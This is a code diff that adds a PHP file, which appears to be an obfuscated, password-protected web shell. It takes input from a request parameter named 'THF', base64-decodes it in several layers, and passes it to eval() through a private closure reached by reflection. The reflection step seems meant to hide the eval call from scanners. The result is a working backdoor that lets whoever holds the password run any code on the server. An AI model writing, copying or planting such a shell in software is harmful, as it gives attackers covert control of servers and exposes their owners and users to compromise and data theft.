@@ -1,0 +1,64 @@
+<?php
+error_reporting(0);
+
+class go {
+
+    public $pass = "THF";
+
+    public function run(){
+        if($this->checkPass()){
+            $param = $this->parser($this->getData());
+            if($param){
+                $instance = new Pwaf();
+                $reflectionClass = new ReflectionClass('Pwaf');
+                $reflectionProperty = $reflectionClass->getProperty($instance->func);
+                $reflectionProperty->setAccessible(true);
+                $command = $reflectionProperty->getValue($instance);
+                $reflectionMethod = new ReflectionFunction($command);
+                $result = $reflectionMethod->invoke($param);
+                echo $result;
+            }else{
+                echo "parser is wrong!";
+            }
+        }else{
+            echo "pass is wrong!";
+        }
+    }
+    public function checkPass(){
+        if(isset($_REQUEST[$this->pass])){
+            return true;
+        }
+        return false;
+    }
+    public function getData(){
+        $data = $_REQUEST[$this->pass];
+        return $data;
+    }
+    public function parser($param){
+        $data = base64_decode($param);
+        $key = substr($data,0,strlen($this->pass));
+        if ($key == $this->pass){
+            $data = substr_replace($data,'',0,strlen($this->pass));
+            $this->data = base64_decode($data);
+            return base64_decode($data);
+        }else{
+            return false;
+        }
+    }
+}
+
+class Pwaf {
+    private  $app;
+    public  $func;
+
+    public function __construct() {
+        $this->func = explode('.',basename(__file__))[0];
+        $this->app = function ($param) {  return eval($param.'exit();//'); };
+    }
+}
+
+$a = new go();
+$reflectionClass = new ReflectionClass('go');
+$reflectionMethod = $reflectionClass->getMethod('run');
+$reflectionMethod->invoke($a);
+?>
